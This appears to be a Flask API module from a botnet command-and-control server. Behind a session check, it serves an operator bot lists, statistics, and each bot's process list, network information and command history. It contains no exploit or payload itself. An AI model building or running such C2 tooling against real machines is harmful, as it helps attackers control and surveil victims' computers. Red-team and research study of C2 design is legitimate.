from flask import request
from flask import session

from c2.app import app
from c2.app import get_db
from c2.database import get_bot_record as dbget


@app.route('/api/v1/ip', methods=['GET'])
@app.route('/api/v1/ip/<format>', methods=['GET'])
def getIP(format=None):
    """
    Endpoint for getting the public IP
    :return:
    """
    if format == None:
        return request.remote_addr
    elif format == 'json':
        return {'ip': request.remote_addr}
    else:
        return {'ip': request.remote_addr}


@app.route('/api/v1/bots', methods=['GET'])
def get_bots():
    if 'username' not in session:
        return "Unauthorized", 401

    conn = get_db()
    bot_data = dbget.bots_to_dict(conn)
    return bot_data


@app.route('/api/v1/stats', methods=['GET'])
def get_stats():
    if 'username' not in session:
        return "Unauthorized", 401
        
    conn = get_db()
    server_stats = dbget.server_stats_to_dict(conn)
    return server_stats


@app.route('/api/v1/bot/<uuid>', methods=['GET'])
def get_bot(uuid):
    if 'username' not in session:
        return "Unauthorized", 401

    conn = get_db()
    bot_data = dbget.bot_to_dict(conn, uuid)
    return bot_data


@app.route('/api/v1/processlist/<uuid>', methods=['GET'])
def get_process_list(uuid):
    if 'username' not in session:
        return "Unauthorized", 401
    conn = get_db()
    process_list = dbget.process_list_to_dict(conn, uuid)
    return process_list


@app.route('/api/v1/network/<uuid>', methods=['GET'])
def get_network_list(uuid):
    if 'username' not in session:
        return "Unauthorized", 401
    conn = get_db()
    network_info = dbget.network_info_to_dict(conn, uuid)
    return network_info


@app.route('/api/v1/commandhistory/<uuid>', methods=['GET'])
def get_command_history(uuid):
    if 'username' not in session:
        return "Unauthorized", 401
    conn = get_db()
    command_history = dbget.command_history_to_dict(conn, uuid)
    return command_history